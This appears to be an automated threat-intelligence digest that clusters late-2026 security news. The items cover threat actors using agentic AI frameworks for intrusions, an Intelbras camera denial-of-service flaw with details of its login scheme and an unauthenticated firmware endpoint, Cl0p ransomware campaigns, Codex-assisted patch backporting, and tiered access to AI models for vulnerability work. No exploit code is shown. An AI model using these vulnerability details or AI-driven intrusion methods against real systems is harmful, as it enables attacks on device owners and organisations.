  - Summary: Written by: Aurora Blum, David Mainor, Rohit Nambiar, Omar ElAhdan, Matthew McWhirt, Will Silverstone, Bhavesh Dhake, Chris Busse Introduction Recent intrusions in which threat actors have been observed weaponizing agentic frameworks to execute highly-automated intrusions has put a spotlight on evolving adversarial use of LLMs. In our September 2026 report , Google Threat Intelligence Group (GTIG) noted that forward leaning adversaries were beginning to transition from basic prompting to agentic workflows and LLM-enabled automation. Since this publication, GTIG and Mandiant have observed multiple threat actors abusing the open-source, agentic pentesting frameworks ARTEX, Hexstrike and CAIRN in incident response engagements to conduct a broad range of actions across multiple phases of the attack life cycle. This activity has been seen across the threat landscape, as noted in a recent Wiz report . The emergence of Artex and similar agentic offensive intrusion frameworks underscores a bro
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: ARTEX and Friends: Enter Agentic Offensive Frameworks
  - Published: 2026-10-30T14:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/threat-intelligence/artex-and-friends-enter-agentic-offensive-frameworks/
  - Summary: Written by: Aurora Blum, David Mainor, Rohit Nambiar, Omar ElAhdan, Matthew McWhirt, Will Silverstone, Bhavesh Dhake, Chris Busse Introduction Recent intrusions in which threat actors have been observed weaponizing agentic frameworks to execute highly-automated intrusions has put a spotlight on evolving adversarial use of LLMs. In our September 2026 report , Google Threat Intelligence Group (GTIG) noted that forward leaning adversaries were beginning to transition from basic prompting to agentic workflows and LLM-enabled automation. Since this publication, GTIG and Mandiant have observed multiple threat actors abusing the open-source, agentic pentesting frameworks ARTEX, Hexstrike and CAIRN in incident response engagements to conduct a broad range of actions across multiple phases of the attack life cycle. This activity has been seen across the threat landscape, as noted in a recent Wiz report . The emergence of Artex and similar agentic offensive intrusion frameworks underscores a bro

### Cluster 862a80147d — score 14

- Title: Millions of security cameras at risk: DoS vulnerability in Intelbras devices
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-10-28T10:00:18+00:00
- Link: https://securelist.com/intelbras-camera-vulnerability/121131/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ddos
- affected_industries: manufacturing_industrial
- urgency_signals: poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ddos
- affected_industries: manufacturing_industrial
- urgency_signals: poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_primary_research

#### Summary

```
During our research, we discovered a denial-of-service vulnerability that could affect millions of Intelbras IP camera systems built on the platform platform of a popular Chinese manufacturer.
```

#### Full body

```
Table of Contents Background Firmware How authentication works Affected endpoint PoC: vulnerability exploitation New firmware version Real risk Takeaways Authors João Victor Background Network-connected surveillance cameras are now widespread in both home and enterprise environments, so securing them is essential to safeguarding physical spaces and sensitive assets. As these devices continue to gain new features and network connectivity capabilities, vulnerabilities in their implementation can have significant security implications. During our research, we discovered a denial-of-service vulnerability that affects Intelbras IP cameras systems. The flaw resides in a firmware update endpoint that is accessible without authentication and allows anyone with access to the local Wi-Fi network to knock cameras offline. A single request disrupts the camera for only about a minute, but sending periodic requests keeps the device offline indefinitely. We reported the issue to Intelbras, monitored the remediation process, validated the fix in the new firmware, and will now demonstrate the exploitation procedure step-by-step. Following our notification, Intelbras patched the vulnerability and released updated firmware ( R.260804 ) along with update instructions . A candidate ID of CAN-2026-2035970 has been assigned by MITRE following submission, pending the final CVE assignment. Additionally, the Intelbras team recently informed us that MITRE has classified the vulnerability as Medium, assigning it a score of 5.1 under the CVSS 4.0 framework. The issue discussed in this article is no longer present in the latest firmware version. Firmware Intelbras provides firmware files on its official website. While users can manually install these updates via an SD card, the cameras also natively support firmware upgrades over the local network via their web interface and mobile app. We obtained the firmware version v240927 for the iM3B-C (IM3 C) camera, which was the latest available version at the time of our research. According to Intelbras, the same firmware is also compatible with the iMX C, iM4 C, iM5 SC, iME 360 C, and iM7+ FC models. Below, we can view the firmware version and the camera model used as an example. To provide context, we will explain how the camera’s authentication mechanism works and why it is relevant to accessing the camera’s endpoints. The main firmware component is an ARM binary named sonia , responsible for controlling the kernel drivers used by the camera hardware, authentication, and livestream recording, among other things. How authentication works The global.login RPC method handles authentication at the /RPC2_Login endpoint. First, the client, such as the mobile app or a custom script, sends the username and an empty password. The camera responds with an authentication challenge (a set of values to verify the password without transmitting it). This response returns a temporary session, the encryption type in the encryption field, a random value, and a realm (authentication scope). At this stage, a false response is normal and does not indicate a failed login, as the authentication process is not yet complete. Next, the client calculates the response password from the authentication challenge . It first generates an MD5 (username:realm:original_password) hash as the base. It then calculates a second MD5 (username:random:first_md5) hash, where first_md5 is the result of the previous step . To complete the authentication, the client sends this final result back to /RPC2_Login in a second global.login call, passing the username, calculated password, and temporary session ID. If the login is accepted, the camera returns true and a new, authenticated session. This session must be used for all subsequent RPC calls, including the camera’s other endpoints, for example, the one that reboots the device or those that expose sensitive information. Affected endpoint The affected endpoint is the firmware upgrade route http://<ip_addre
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: Millions of security cameras at risk: DoS vulnerability in Intelbras devices
  - Published: 2026-10-28T10:00:18+00:00
  - Link: https://securelist.com/intelbras-camera-vulnerability/121131/
  - Summary: During our research, we discovered a denial-of-service vulnerability that could affect millions of Intelbras IP camera systems built on the platform platform of a popular Chinese manufacturer.

### Cluster cc0a050b9a — score 14

- Title: Why Old Vulnerability Management Habits Keep Rising from the Grave
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-10-29T14:25:00+00:00
- Link: https://horizon3.ai/intelligence/blogs/old-vulnerability-management-habits-ctem/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Three customer stories show how to keep severity-only priorities and closed-ticket counts from undermining your CTEM program by tying findings to attack paths and verifying fixes.
```

#### Full body

```
Why Old Vulnerability Management Habits Keep Rising from the Grave Stephen Gates October 29, 2026 Blogs Three customer stories show how to keep outdated practices from undermining your CTEM program. You adopted Continuous Threat Exposure Management (CTEM). So why do the same old vulnerability management habits keep rising from the grave? AI is adding urgency to a familiar debate: is vulnerability management dead? Discovery, patching, and remediation remain essential. What needs to change is how organizations decide what to fix and establish whether that work reduced exposure. Yet the way many organizations report progress still rewards the old habits. Reporting day arrives, and there they are: severity scores alone driving priorities, closed tickets standing in for reduced risk, and a smaller backlog passing for proof of security. Those habits persist because adopting a framework is easier than changing how an organization makes decisions. Completing the work does not prove that it changed what an attacker could achieve. Throughout this series, we have examined how to operationalize CTEM, why validation matters, and how to measure results. Now comes the practical test: are those principles changing what teams do? Three customer stories show where to start. What’s Lurking Behind an Individual Finding? Remediation queues divide work into individual findings, each with a severity, an owner, and a deadline. That helps organize tasks, but it can separate a weakness from the attack path that makes it consequential. A major equipment rental company encountered this when an employee started a PHP web server for testing in the root directory. The change exposed SSH key pairs, creating an opportunity for lateral movement. NodeZero® surfaced the issue roughly eight hours after it was introduced. The problem extended beyond the server configuration. Which systems accepted those keys? What privileges did they provide? What could an attacker reach? Those answers determine what needs to change. Removing the exposed files, for example, would not address the possibility that someone had already obtained usable keys. Remediation must account for the access those credentials enable. This matters when security identifies the exposure but infrastructure, application, or identity teams own the fix. Give those teams the attack path, the evidence, and the fix guidance. Each owner should understand how their action contributes to preventing the demonstrated impact. The same evidence can reveal problems that individual tickets conceal. Repeatedly exposed secrets may point to a deployment practice that needs correction. Repeated privilege escalation may indicate excessive permissions that require broader attention. That is how one CTEM cycle informs the next. Fix the immediate exposure, then use what you learned to address the conditions that keep producing it. You Don’t Need to Bury Every Finding to Reduce Exposure A global investment firm offers a useful challenge to conventional vulnerability reporting. After remediation, a follow-up NodeZero pentest covering the same scope still identified 46 minor weaknesses. Yet demonstrated impacts fell from 251 to zero. Compromised hosts dropped from 67 to zero, and compromised credentials fell from 52 to zero. The backlog was not empty. The remediation had still changed what an attacker could achieve in the test. Vulnerable does not equal exploitable. Exploitable does not equal impact. For this firm, that distinction was measurable. The same-scope retest demonstrated that the previous compromise outcomes were no longer achievable. The team could show meaningful progress without claiming a flawless environment. That evidence supports better decisions about the next round of work. Which impacts remain possible? Which critical systems or sensitive data are still reachable? Where would another intervention reduce the greatest exposure? Remaining findings still need appropriate treatment. Threat intelligence, asset
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: Why Old Vulnerability Management Habits Keep Rising from the Grave
  - Published: 2026-10-29T14:25:00+00:00
  - Link: https://horizon3.ai/intelligence/blogs/old-vulnerability-management-habits-ctem/
  - Summary: Three customer stories show how to keep severity-only priorities and closed-ticket counts from undermining your CTEM program by tying findings to attack paths and verifying fixes.

### Cluster 78a030ca21 — score 14

- Title: Backporting security fixes at scale with Codex
- Source: Trail of Bits (offensive_vulnerability_research)
- Published: 2026-11-02T12:00:00+00:00
- Link: https://blog.trailofbits.com/2026/11/02/backporting-security-fixes-at-scale-with-codex/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Linux kernel

#### Cluster taxonomy (union across members)
- affected_products: Linux kernel
- content_type: news_report
- confidence_tier: tier_1_offensive_research, tier_1_primary_research

#### Primary article taxonomy
- affected_products: Linux kernel
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Stable Linux releases lack existing security fixes because backporting them is time-consuming and often thankless work. We’re using Codex to reduce the backporting process time from days to hours per fix, empowering human patch reviewers to rapidly submit fixes for critical software like Ubuntu Long Term Support, Fedora, and the Linux kernel. By October 29, our project helped deliver fixes for 149 distinct CVEs into stable Linux kernel releases, and several fixes to Fedora and Ubuntu packages. Deploying fixes to older software requires multiple steps, including adapting fixes to older code, checking dependencies, and ensuring the fix did not introduce new bugs. A single task (like tracking down a bug in a bad commit) can take a week or more of effort that no one sees or appreciates. Our Codex workflow has reduced the human effort required to prepare and review fixes. Excluding project-specific initial setup, preparing and reviewing a straightforward backport takes about 30 minutes of h
```

#### Full body

```
Page content Stable Linux releases lack existing security fixes because backporting them is time-consuming and often thankless work. We’re using Codex to reduce the backporting process time from days to hours per fix, empowering human patch reviewers to rapidly submit fixes for critical software like Ubuntu Long Term Support, Fedora, and the Linux kernel. By October 29, our project helped deliver fixes for 149 distinct CVEs into stable Linux kernel releases, and several fixes to Fedora and Ubuntu packages. Deploying fixes to older software requires multiple steps, including adapting fixes to older code, checking dependencies, and ensuring the fix did not introduce new bugs. A single task (like tracking down a bug in a bad commit) can take a week or more of effort that no one sees or appreciates. Our Codex workflow has reduced the human effort required to prepare and review fixes. Excluding project-specific initial setup, preparing and reviewing a straightforward backport takes about 30 minutes of human attention; a more involved case can take around three hours. The workflow’s approach is twofold: agents perform activities like identifying missing fixes, adapting patches, assembling validation evidence, running tests, and preparing submission packets, while engineers review the patches and submit them to maintainers. Those estimates only cover patch preparation and review; regression testing and maintainer acceptance remain essential. But the reduced human commitment makes a substantial class of neglected security work practical to undertake. The patch backlog is large, but we now have a practical way to work through it. Do we have to decide between stability and security? Software has bugs, and we try to fix them when we can. The first place the fix happens is in the latest version of the software. Unfortunately, that’s often the only place where the fix happens. Backporting is the process of getting a fix from the latest source code to older versions. Fixes for big-name, critical bugs are indeed often backported quickly. But for many other bugs, the backporting process never happens. It is easy to understand why: software packaging is often done by volunteers who are already overworked, and backporting is frustrating, thankless work that gets little credit or publicity. For open source projects staffed by teams of volunteers, backports are (understandably) a low priority. As XFS developer Dave Chinner once described, this work is “ effectively a full time job ” that simply goes undone without sufficient resources. The lack of backports is a problem because almost no one runs the latest and greatest version of software that’s been freshly built with today’s code changes. People overwhelmingly prefer slightly older, more tested software packaged in “long term stable” releases. For example, about 95% of Ubuntu Linux installations are of the Long Term Support (LTS) variety. When looking at installed Linux kernel packages from Debian’s popcon , the overwhelming majority are based on older stable trees: Figure 1: A Codex-generated graph of recently installed kernel packages from Debian’s popcon. The overwhelming majority (about 96%) are older, stable releases, and not the latest kernel series. Users are faced with a decision: they can either stick with a stable, familiar version of software that has security flaws, or upgrade to a newer version that fixes those flaws but introduces other changes and new features they may not want. Many people purposely do not update to new releases; I think this is entirely justified and normal end-user behavior. Just recently, I updated my Mac to macOS 27 and couldn’t use a printer that had worked flawlessly for years (until Codex wrote a new, compatible printer driver). Similar situations effectively require older software. We should not have to make a choice between stability and security. Thousands of known CVEs lack stable-branch fixes A swarm of cyber-capable AI agents can cut through a netw
```

#### Corroborating sources (2)

- **Trail of Bits** (offensive_vulnerability_research)
  - Title: Backporting security fixes at scale with Codex
  - Published: 2026-11-02T12:00:00+00:00
  - Link: https://blog.trailofbits.com/2026/11/02/backporting-security-fixes-at-scale-with-codex/
  - Summary: Stable Linux releases lack existing security fixes because backporting them is time-consuming and often thankless work. We’re using Codex to reduce the backporting process time from days to hours per fix, empowering human patch reviewers to rapidly submit fixes for critical software like Ubuntu Long Term Support, Fedora, and the Linux kernel. By October 29, our project helped deliver fixes for 149 distinct CVEs into stable Linux kernel releases, and several fixes to Fedora and Ubuntu packages. Deploying fixes to older software requires multiple steps, including adapting fixes to older code, checking dependencies, and ensuring the fix did not introduce new bugs. A single task (like tracking down a bug in a bad commit) can take a week or more of effort that no one sees or appreciates. Our Codex workflow has reduced the human effort required to prepare and review fixes. Excluding project-specific initial setup, preparing and reviewing a straightforward backport takes about 30 minutes of h
- **ESET WeLiveSecurity** (threat_research_primary)
  - Title: Lessons from Cybersecurity Black Week
  - Published: 2026-10-28T10:33:51+00:00
  - Link: https://www.welivesecurity.com/en/business-security/lessons-cybersecurity-black-week/
  - Summary: A critical PHP flaw, leaked Linux kernel reports, a poisoned LiteLLM release, and more, all in seven days. Which threats called for immediate action, and which generated more noise than real danger?

### Cluster b56ffde518 — score 12

- Title: 2nd November – Threat Intelligence Report
- Source: Check Point Research (threat_research_primary)
- Published: 2026-11-02T15:57:23+00:00
- Link: https://research.checkpoint.com/2026/2nd-november-threat-intelligence-report/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, credential_theft, data_breach, phishing_social_eng, ransomware_extortion, web_shell_backdoor
- affected_industries: aviation_defense, financial_services, government, telecommunications
- affected_products: Drupal, Linux kernel
- cve_ids: CVE-2026-111497, CVE-2026-118539, CVE-2026-98432
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft, data_breach, apt_espionage, web_shell_backdoor, active_exploitation
- affected_industries: financial_services, government, telecommunications, aviation_defense
- affected_products: Linux kernel, Drupal
- cve_ids: CVE-2026-111497, CVE-2026-98432, CVE-2026-118539
- urgency_signals: actively_exploited, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
For the latest discoveries in cyber research for the week of 2nd November, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Binance, a global cryptocurrency exchange, has suffered a cyberattack resulting in the theft of approximately $6.3 billion in digital assets. Attackers reportedly compromised a DevOps engineer’s laptop and abused internal wallet infrastructure […] The post 2nd November – Threat Intelligence Report appeared first on Check Point Research .
```

#### Full body

```
FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 2nd November – Threat Intelligence Report November 2, 2026 https://research.checkpoint.com/2026/2nd-november-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 2nd November, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Binance, a global cryptocurrency exchange, has suffered a cyberattack resulting in the theft of approximately $6.3 billion in digital assets. Attackers reportedly compromised a DevOps engineer’s laptop and abused internal wallet infrastructure to authorize unauthorized withdrawals. The incident ranks among the largest cryptocurrency thefts ever recorded and is linked to North Korean group. Polymarket, a US-based prediction market platform, has disclosed a cyberattack involving a compromised third-party service that distributed malicious JavaScript to its website. The script hijacked authenticated trading sessions and attempted unauthorized transactions. Approximately $2.7 million in cryptocurrency was traced to a suspected attacker-controlled wallet. Japan Airlines, a major Japanese international airline, has disclosed a third-party data breach affecting approximately 92,000 passengers through the Amadeus reservation system. Exposed records included passenger names and flight information. Approximately 2,000 individuals also had contact information, passport details, and additional travel records potentially accessed. The Florida Department of Education has disclosed a data breach involving unauthorized access to its student financial aid website, potentially affecting 4.9 million individuals. Compromised information reportedly includes names, Social Security numbers, dates of birth, addresses, and contact details. The incident was identified on October 19. AI THREATS Researchers have identified extensive use of AI agents by the GOLD OGRE ransomware group during Aur0ra attacks. Operators supplied compromised credentials and objectives, allowing AI tools to perform network reconnaissance, identify privileged accounts, and support lateral movement. The group also used AI-assisted development to test endpoint security evasion techniques. Researchers have documented expanding AI adoption among North Korean cyber threat actors. The activity includes using language models to support reconnaissance, develop malicious tools, refine social engineering, and accelerate intrusion workflows. The findings describe how established espionage and financially motivated operations are incorporating AI into existing attack techniques. Researchers have uncovered a global espionage campaign in which the China-linked VAPOR PANDA group used the AI-enabled ARTEX framework against more than 200 organizations. Targets included government agencies, telecommunications providers, and defense companies across at least 14 countries. Confirmed intrusions involved credential theft and deployment of the BLOODALCHEMY backdoor. VULNERABILITIES AND PATCHES Check Point Research have analyzed HTTP2Shell (CVE-2026-111497), an actively exploited remote code execution vulnerability affecting Brotli decompression implementations. Initially associated with Node.js, the flaw may also affect other components, including Python packages, .NET, and proxies. Automated scanning and suspicious exploitation attempts have been observed. Check Point IPS provides protection against this threat (Node.js Brotli Remote Code Execution (CVE-2026-111497))) A critical Linux kernel vulnerability, CVE-2026-98432, has been disclosed with a CVSS score of 9.8. The memory management flaw affects TCP networking and can enable unauthenticated remote code execution with root privileges on systems exposing Multipath TCP listeners. Drupal has addressed CVE-2026-118539, a highly critical access control vulnerability in the Commerce Core module used by online stores. Insufficient protection of application routes and data fields allows unauthenticated a
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: 2nd November – Threat Intelligence Report
  - Published: 2026-11-02T15:57:23+00:00
  - Link: https://research.checkpoint.com/2026/2nd-november-threat-intelligence-report/
  - Summary: For the latest discoveries in cyber research for the week of 2nd November, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Binance, a global cryptocurrency exchange, has suffered a cyberattack resulting in the theft of approximately $6.3 billion in digital assets. Attackers reportedly compromised a DevOps engineer’s laptop and abused internal wallet infrastructure […] The post 2nd November – Threat Intelligence Report appeared first on Check Point Research .

### Cluster b3f186b034 — score 12

- Title: YARA-X 1.22.1 Release, (Sat, Oct 31st)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-10-31T10:48:17+00:00
- Link: https://isc.sans.edu/diary/rss/33474
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
YARA-X&#;x26;#;39;s 1.22.1 is a bugfix version, it brings 2 bugfixes.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: YARA-X 1.22.1 Release, (Sat, Oct 31st)
  - Published: 2026-10-31T10:48:17+00:00
  - Link: https://isc.sans.edu/diary/rss/33474
  - Summary: YARA-X&#;x26;#;39;s 1.22.1 is a bugfix version, it brings 2 bugfixes.

### Cluster 2cb50a13c9 — score 12

- Title: YARA-X 1.22.0 Release, (Sun, Oct 25th)
- Source: SANS Internet Storm Center (government_authoritative)
- Published: 2026-10-31T10:45:40+00:00
- Link: https://isc.sans.edu/diary/rss/33454
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_government

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_government

#### Summary

```
YARA-X&#39&#x3b;s 1.22.0 release brings 11 improvements and 9 bugfixes.
```

#### Corroborating sources (1)

- **SANS Internet Storm Center** (government_authoritative)
  - Title: YARA-X 1.22.0 Release, (Sun, Oct 25th)
  - Published: 2026-10-31T10:45:40+00:00
  - Link: https://isc.sans.edu/diary/rss/33454
  - Summary: YARA-X&#39&#x3b;s 1.22.0 release brings 11 improvements and 9 bugfixes.

### Cluster 2ec87fbc0b — score 12

- Title: Mythos access is expanding: what this means for vulnerability management
- Source: Sysdig (detection_response_operations)
- Published: 2026-10-27T00:00:00+00:00
- Link: https://webflow.sysdig.com/blog/mythos-access-is-expanding-what-this-means-for-vulnerability-management
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: critical_infrastructure
- affected_products: Anthropic/Claude
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_industries: critical_infrastructure
- affected_products: Anthropic/Claude
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Full body

```
ai-for-cloud-security This is some text inside of a div block. < back to blog Mythos access is expanding: what this means for vulnerability management Published by: Matt Kim Sr. Product Marketing Manager Sr. Product Marketing Manager @ linkedin Subscribe to Threat Research REGISTER FOR THE WEBINAR Published: October 27, 2026 Table of contents TRT in your inbox Get security briefings from the Threat Research Team New campaigns, attacker techniques, and detection guidance — straight to your inbox. Subscribe falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more Anthropic’s Claude Mythos put vulnerability management in the boardroom when it was released earlier this year, and the conversation around it has evolved. Press coverage continues to find new angles, and there’s plenty of discourse around how AI is changing everything about cybersecurity. In the months since the initial release of Mythos Preview, there have been a few developments around what Mythos can do and who is able to access it. But what does this actually mean for your vulnerability management program? A stronger model, wider access In September, Anthropic shipped Claude Mythos 5.1 , which it calls the model with the strongest cyber capabilities of any they’ve released. Mythos 5.1 is built on the same base model as the generally available Fable 5.1 with different safeguards attached. Then, in October, it folded Project Glasswing, the early-access program that gave select critical infrastructure providers and industry partners access to Mythos, into an expanded tiered Cyber Verification Program (CVP). The revamped CVP spans everyday defensive work up through the highest-sensitivity critical infrastructure. This means that compared to at launch, machine-speed vulnerability discovery that used to be limited to a small group will reach a wider set of defenders. According to Anthropic, Glasswing partners turned up more than 129,000 verified vulnerabilities between April and July, over 33,000 of them critical or high severity. More access to Mythos-class discovery sounds like it should mean more vulnerabilities found, faster, across more organizations. While this is true, that large number isn’t the full story. Discovery and exploitation aren’t the same thing Anthropic noted in its announcement that the generally available Fable 5.1 can now be used to discover software vulnerabilities, but explicitly not to develop exploits for them. Activities that could be used maliciously like penetration testing, exploit generation, etc., are redirected to lower-tier models. The same gating carries into Mythos. The CVP’s three access tiers wall off penetration testing and red teaming work behind the two highest, most heavily vetted tiers. So while broader access to Mythos-class capability means broader access to finding things faster, it doesn’t, by itself, mean broader access to attacking anything. Also, Mythos still isn’t broadly available: access runs through vetted organizations in the CVP, so it isn’t something readily on hand for attackers. That’s not to say automated attacks aren’t happening, but that’s a separate development, not something that traces back to Mythos specifically. Lumping every agentic AI risk together misses where the actual exposure is coming from. The core of vulnerability management hasn’t changed A lot of the coverage of Mythos makes it sound scarier than it needs to. While it does make vulnerability discovery significantly faster, no security team was patching every known CVE even before Mythos existed. Using AI agents for defense can increase teams’ speed and scope, but the real differentiator continues to be knowing which findings are in active, loaded packages, reachable, and creating real risk, versus which ones are noise with a scary CVSS score attached. Exploits are getting faster too. Mandiant now p
```

#### Corroborating sources (1)

- **Sysdig** (detection_response_operations)
  - Title: Mythos access is expanding: what this means for vulnerability management
  - Published: 2026-10-27T00:00:00+00:00
  - Link: https://webflow.sysdig.com/blog/mythos-access-is-expanding-what-this-means-for-vulnerability-management

### Cluster fb556ca51b — score 12

- Title: Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-11-02T14:33:17+00:00
- Link: https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Cl0p

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, zero_day
- actor_attribution: Cl0p
- affected_products: SolarWinds
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day
- actor_attribution: Cl0p
- affected_products: SolarWinds
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Analyze Cl0p ransomware's history of targeting MFT systems. Discover their attack pattern in threat intelligence to improve cyber attack surface reduction.
```

#### Full body

```
Eli Woodward 5 min read November 2, 2026 Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days PART I: Operational Profile and Campaign Analysis 1. The MFT Targeting Pattern Cl0p's defining operational characteristic is a sustained and systematic focus on internet-facing applications that hold or move valuable data. Across ten known campaigns, the group has targeted Accellion FTA, SolarWinds Serv-U, Fortra GoAnywhere MFT, PaperCut MF/NG, Progress MOVEit Transfer, SysAid ITSM, Cleo MFT (Harmony, VLTrader, LexiCom), Oracle E-Business Suite, Gladinet Centrestack/TrioFox and, most recently, PTC Windchill and FlexPLM. Managed file transfer (MFT) remains the core of the pattern. The exceptions — PaperCut (print management), SysAid (IT service management), Oracle EBS (enterprise resource planning) and Windchill/FlexPLM (product lifecycle management) — share the same architectural profile: an internet-facing application that processes, stores or transfers sensitive files. Windchill sharpens the picture. PLM platforms hold engineering schematics, design data and other proprietary product information rather than the personal or health records most breach programs are built around. Cl0p's target selection is best understood through the value of the data an edge application holds, not just its product category. This consistency is significant for two reasons. First, it indicates strategic specialization rather than opportunistic exploitation: the group has invested in developing or acquiring zero-day capabilities for this class of application, deploying zero-day exploits in eight of ten campaigns. Second, it defines a bounded, defensible attack surface. Organizations that operate these platforms can identify themselves as potential targets and implement category-specific protections — a defensive advantage that is uncommon against most ransomware groups. FIGURE 1 · COMPLETE CL0P CAMPAIGN HISTORY, 2020–2026 2. Exploitation Timeline The chronological record of Cl0p campaigns reveals a distinctive operational tempo: extended dormancy periods punctuated by concentrated bursts of activity. FIGURE 2 · CAMPAIGN TIMELINE WITH INTER-CAMPAIGN INTERVALS, DEC 2020 – AUG 2026 The group's longest dormancy — approximately 14 months between the SolarWinds Serv-U exploitation in late 2021 and the Fortra GoAnywhere campaign in January 2023 — was followed by its most active phase: four campaigns across four separate technologies in ten months, three of them (GoAnywhere, PaperCut and MOVEit) in the first five months of 2023. This burst-and-pause cadence suggests a development cycle in which the group acquires or develops exploits, executes campaigns in rapid succession, and then withdraws to prepare for the next cycle. A second long pause of roughly 12 months followed SysAid before Cleo in October 2024. The first edition of this report used 10- to 14-month intervals as a rough forecasting baseline and noted, as of mid-2026, that the next cycle might be approaching. It arrived sooner than that baseline implied: Windchill exploitation began in early June 2026, about seven months after Centrestack. Taken together, Oracle EBS, Centrestack and Windchill represent three campaigns in roughly ten months — a burst comparable to 2023. FORECASTING IMPLICATION: Long dormancy periods remain characteristic of Cl0p, but they are not a safe planning assumption. The recent cycle has compressed. Defenders should treat the period immediately after a campaign as a preparation window for the next one, not a quiet period. 3. Seasonal and holiday clustering FIGURE 3 · CAMPAIGNS BY QUARTER OF INITIATION — Q4 ACCOUNTS FOR HALF OF ALL CAMPAIGNS When campaigns are mapped by calendar quarter, Q4 is the dominant operational window. Five of ten confirmed campaigns were initiated during October through December — as many as all other quarters combined. This clustering is operationally meaningful: Q4 coincides with major holidays in the United States and Europe, periods when security oper
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days
  - Published: 2026-11-02T14:33:17+00:00
  - Link: https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence
  - Summary: Analyze Cl0p ransomware's history of targeting MFT systems. Discover their attack pattern in threat intelligence to improve cyber attack surface reduction.

### Cluster ab0d5cdeb9 — score 11

- Title: AI Vulnerability Finding
- Source: Schneier on Security (practitioner_analysis)
- Published: 2026-11-02T12:02:34+00:00
- Link: https://www.schneier.com/blog/archives/2026/11/ai-vulnerability-finding-2.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_3_analysis

#### Summary

```
A comment : 3% of ‘critical’ software security bugs, in all of recorded history, have been found in the last month. This is on pace to find another ~100,000 bugs this year alone, adding ~26% more vulnerabilities to the all time total Do you realize how fucking insane that is? Yes. It is a new world out there.
```

#### Full body

```
Clive Robinson • November 2, 2026 11:45 AM @ Jeff, ALL, With regards, “More bugs aren’t necessarily being found because there’s more of them being created than before, the more likely explanation is that the bugs were already there and now we’re closing them at the fastest pace in history! “ Actually both points are true… Yes we are finding “new instances of bugs from known classes of bugs” at a much higher rate. But that does not mean we are finding “new classes of bugs” (ie black swans). But also “vibe coding” by AI is certainly generating “new instances of bugs” at a more alarming rate. It’s why quite a few employers are now seeing “laying off humans with AI” as being not just horrifically unprofitable, but extremely dangerous to the business. Yes, AI has niche advantages, but those niches are invariably not general in nature. Even China is begining to see the dangers of even low cost AI. None of this was unpredictable and quite a few have called it that way. However when you’ve handed over everything for a few tulip bulbs you had better be sure not only are they going to grow but that people are going to by the result sufficient to pay a “Return on Investment”(ROI). Right now the ROI in “General AI” is not a certainty or even a likely hood based on the current economy… Then there is “clearing up the mess of harms” the 